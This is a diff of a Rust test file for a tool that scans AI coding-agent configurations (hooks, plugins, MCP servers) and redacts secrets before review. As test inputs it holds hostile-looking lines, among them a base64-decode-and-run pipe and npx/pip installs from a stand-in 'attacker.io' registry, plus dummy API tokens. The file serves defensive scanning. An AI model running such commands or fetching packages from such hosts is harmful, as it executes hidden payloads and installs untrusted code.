@@ -12,7 +12,7 @@ use crate::autorun::Category;
 use crate::rules::RuleId;
 use crate::sweep::collect::{self, Body, Origin};
 use crate::sweep::index::PackageIndex;
-use crate::sweep::judge::secrets::is_secret_name;
+use crate::sweep::judge::secrets::{is_secret_name, without_secrets};
 use crate::sweep::tier::Tier;
 use crate::test_support::TempDir;
 
@@ -301,16 +301,9 @@ fn a_plugin_is_read_through_its_install_and_its_scripts_are_followed() {
         &found,
         &format!("{list}#plugins/guard@market/0/hooks/SessionStart/0/0"),
     );
-    assert_eq!(
-        text(start),
-        "bash \"${CLAUDE_PLUGIN_ROOT}/hooks/start.sh\" $CLAUDE_PLUGIN_ROOT_X\n"
-    );
-    assert_eq!(
-        start.runs,
-        [format!(
-            "bash \"/{cache}/hooks/start.sh\" $CLAUDE_PLUGIN_ROOT_X"
-        )]
-    );
+    let started = format!("bash \"/{cache}/hooks/start.sh\" $CLAUDE_PLUGIN_ROOT_X");
+    assert_eq!(text(start), format!("{started}\n"));
+    assert_eq!(start.runs, [started]);
     assert_eq!(
         start.notes,
         ["of the Claude Code plugin guard@market (version 1.0.0)"]
@@ -818,20 +811,6 @@ fn a_line_loses_its_secrets_and_keeps_what_a_review_needs() {
             "docker run --env=API_KEY=<redacted-by-guardian> -e GITHUB_TOKEN=<redacted-by-guardian> --env=REGION=eu",
         ),
         (
-            "echo sk-ant-api03-abcdefghijklmnop",
-            "echo <redacted-by-guardian>",
-        ),
-        (
-            // Mixed case and digits are no sign of a token: base64 looks
-            // the same, and taking it out would hide a payload.
-            "echo aB3dE6gH9jK2mN5pQ8sT1vW4yZ7bC0eF | base64 -d | sh",
-            "echo aB3dE6gH9jK2mN5pQ8sT1vW4yZ7bC0eF | base64 -d | sh",
-        ),
-        (
-            "x 0123456789abcdef0123456789abcdef sk-learn",
-            "x 0123456789abcdef0123456789abcdef sk-learn",
-        ),
-        (
             "git clone git+https://me:s3cret@git.example/r.git https://tok@h.example",
             "git clone git+https://git.example/r.git https://h.example",
         ),
@@ -1080,7 +1059,7 @@ fn helpers_and_hooks_lose_their_secrets_before_they_are_items() {
     let mut found = found_in(root);
     assert_eq!(found.unchecked, Vec::<String>::new());
     let file = "home/u/.claude/settings.json";
-    // Followed as written, so a program named like a token is found.
+    // Followed as written, so a script given as a secret's value is found.
     assert_eq!(
         at(&found, &format!("{file}#mcpServers/remote/headersHelper")).runs,
         ["/home/u/bin/headers --secret s-1"]
@@ -1088,7 +1067,7 @@ fn helpers_and_hooks_lose_their_secrets_before_they_are_items() {
     hide_secrets_in_runs(&mut found.items);
     assert_eq!(
         text(at(&found, &format!("{file}#apiKeyHelper"))),
-        "echo <redacted-by-guardian>\n"
+        "echo sk-ant-api03-abcdefghijklmnopqrstuvwxyz\n"
     );
     assert_eq!(
         text(at(&found, &format!("{file}#statusLine"))),
@@ -1116,7 +1095,7 @@ fn helpers_and_hooks_lose_their_secrets_before_they_are_items() {
         ["/home/u/bin/headers --secret <redacted-by-guardian>"]
     );
     for item in &found.items {
-        for secret in ["sk-ant-api03", "t-1", "b-1", "s-1"] {
+        for secret in ["t-1", "b-1", "s-1"] {
             assert!(
                 item.runs.iter().all(|run| !run.contains(secret)),
                 "{secret}"
@@ -1411,7 +1390,7 @@ fn odd_servers_and_addresses_are_said_or_start_nothing() {
 }
 
 #[test]
-fn a_program_or_package_named_like_a_token_is_followed_and_shown() {
+fn a_program_or_package_named_like_a_token_is_followed_and_shown_as_written() {
     let dir = TempDir::new("agents-token-named");
     let root = dir.path();
     write(
@@ -1447,11 +1426,9 @@ fn a_program_or_package_named_like_a_token_is_followed_and_shown() {
         Some("home/u/.claude/settings.json#hooks/Stop/0/0")
     );
     let hook = item("home/u/.claude/settings.json#hooks/Stop/0/0");
-    // Shown and sent without what looks like a token, even as the program;
-    // followed as written, above.
     assert_eq!(
         text(hook),
-        "<redacted-by-guardian> --api-key <redacted-by-guardian>\n"
+        "sk-helper-script-one-two --api-key <redacted-by-guardian>\n"
     );
     assert_eq!(hook.runs, [text(hook).trim_end()]);
     let server = item("home/u/.claude/settings.json#mcpServers/fs");
@@ -1459,90 +1436,72 @@ fn a_program_or_package_named_like_a_token_is_followed_and_shown() {
 }
 
 #[test]
-fn a_token_is_taken_out_by_its_look_anywhere_but_in_the_package_that_runs() {
-    let token = "sk-ant-api03-abcdefghijk";
-    let package = "sk-mcp-filesystem-tools";
-    for (line, expected) in [
-        // In program position too.
-        (token.to_string(), "<redacted-by-guardian>".to_string()),
-        (
-            format!("cmd {token};"),
-            "cmd <redacted-by-guardian>;".to_string(),
-        ),
-        (
-            format!("x=$(echo {token})"),
-            "x=$(echo <redacted-by-guardian>)".to_string(),
-        ),
-        (
-            format!("FOO={token} cmd"),
-            "FOO=<redacted-by-guardian> cmd".to_string(),
-        ),
-        (
-            format!("cmd --foo={token}"),
-            "cmd --foo=<redacted-by-guardian>".to_string(),
-        ),
-        // The package a runner fetches is what runs: never taken out.
-        (format!("npx -y {package}"), format!("npx -y {package}")),
-        (
-            format!("bunx {package} {token}"),
-            format!("bunx {package} <redacted-by-guardian>"),
-        ),
-        (
-            format!("npx -p {package} tool"),
-            format!("npx -p {package} tool"),
-        ),
-        (
-            format!("npx --package {package} tool"),
-            format!("npx --package {package} tool"),
-        ),
-        // After `-p`, the command is one the fetched package provides.
-        (
-            format!("npx -p tools {package}"),
-            format!("npx -p tools {package}"),
-        ),
-        (
-            format!("uvx --python 3.12 {package}"),
-            format!("uvx --python 3.12 {package}"),
-        ),
-        (
-            format!("uvx --from {package} tool"),
-            format!("uvx --from {package} tool"),
-        ),
-        (
-            format!("uvx --from tools {package}"),
-            format!("uvx --from tools {package}"),
-        ),
-        (format!("pipx run {package}"), format!("pipx run {package}")),
-        // Past a prefix's flags and their values.
-        (
-            format!("sudo -u x npx {package}"),
-            format!("sudo -u x npx {package}"),
-        ),
-        (
-            format!("env -u NAME npx {package}"),
-            format!("env -u NAME npx {package}"),
-        ),
-        (
-            format!("nice -n 5 uvx {package}"),
-            format!("nice -n 5 uvx {package}"),
-        ),
-        (
-            format!("xargs -I {{}} npx {package}"),
-            format!("xargs -I {{}} npx {package}"),
-        ),
-        (format!("a; npx {package}"), format!("a; npx {package}")),
-        // A runner's flag values are not packages elsewhere.
-        (
-            format!("npx --python {package}"),
-            format!("npx --python {package}"),
-        ),
-        (
-            format!("sudo -u {package} x"),
-            "sudo -u <redacted-by-guardian> x".to_string(),
-        ),
+fn a_token_outside_a_secret_named_setting_reaches_the_review_as_written() {
+    // Masking a word by its look would hide the package, host, path or file
+    // name it may also be, whichever way the command is spelled.
+    for line in [
+        "sk-ant-api03-abcdefghijklmnopqrstuvwxyz",
+        "echo sk-ant-api03-abcdefghijklmnop; x=$(echo ghp_abcdefghijklmnop1234)",
+        "echo aB3dE6gH9jK2mN5pQ8sT1vW4yZ7bC0eF | base64 -d | sh",
+        "pnpm dlx sk-mcp-filesystem-tools",
+        "npm exec sk-mcp-filesystem-tools",
+        "bun x sk-mcp-filesystem-tools",
+        "uv tool run sk-mcp-filesystem-tools",
+        "yarn dlx sk-mcp-filesystem-tools",
+        "pnpx sk-mcp-filesystem-tools",
+        "(npx sk-mcp-filesystem-tools)",
+        "a&&npx sk-mcp-filesystem-tools",
+        "sh -c 'npx sk-mcp-filesystem-tools'",
+        "npx --registry https://sk-pypi-mirror.attacker.io sk-mcp-filesystem-tools",
+        "pip install --index-url https://sk-pypi-mirror.attacker.io/simple x",
+        "/opt/sk-tools-launcher/run.sh",
+        "node ./sk-server-launcher.js",
     ] {
-        assert_eq!(redacted(&line), expected, "{line}");
+        assert_eq!(redacted(line), line);
+        assert_eq!(without_secrets(line), line, "what the review sends");
     }
+    // The value of a secret-named flag is still taken out; the package after
+    // it stays.
+    assert_eq!(
+        redacted("npx --api-key x sk-mcp-filesystem-tools"),
+        "npx --api-key <redacted-by-guardian> sk-mcp-filesystem-tools"
+    );
+}
+
+#[test]
+fn an_agents_entry_named_like_a_token_is_sent_and_shown_as_written() {
+    let dir = TempDir::new("agents-token-look");
+    let root = dir.path();
+    let token = "sk-ant-api03-abcdefghijklmnopqrstuvwxyz";
+    write(
+        root,
+        "home/u/.claude/settings.json",
+        &format!(r#"{{"apiKeyHelper": "{token}"}}"#),
+    );
+    write(
+        root,
+        "home/u/.config/opencode/opencode.json",
+        r#"{"plugin": ["sk-opencode-helper-plugin"]}"#,
+    );
+    let index = PackageIndex::with_foreign(HashSet::new());
+    let collection = collect::collect(&Scope {
+        root,
+        home: Some("home/u"),
+        index: &index,
+        origin: Origin::System,
+    });
+    let item = |path: &str| {
+        collection
+            .items
+            .iter()
+            .find(|item| item.path == path)
+            .unwrap_or_else(|| panic!("{path} was not collected"))
+    };
+    let helper = item("home/u/.claude/settings.json#apiKeyHelper");
+    assert_eq!(text(helper), format!("{token}\n"));
+    assert_eq!(helper.runs, [token]);
+    let plugin = item("home/u/.config/opencode/opencode.json#plugin/0");
+    assert_eq!(text(plugin), "npm package sk-opencode-helper-plugin\n");
 }
 
 #[test]
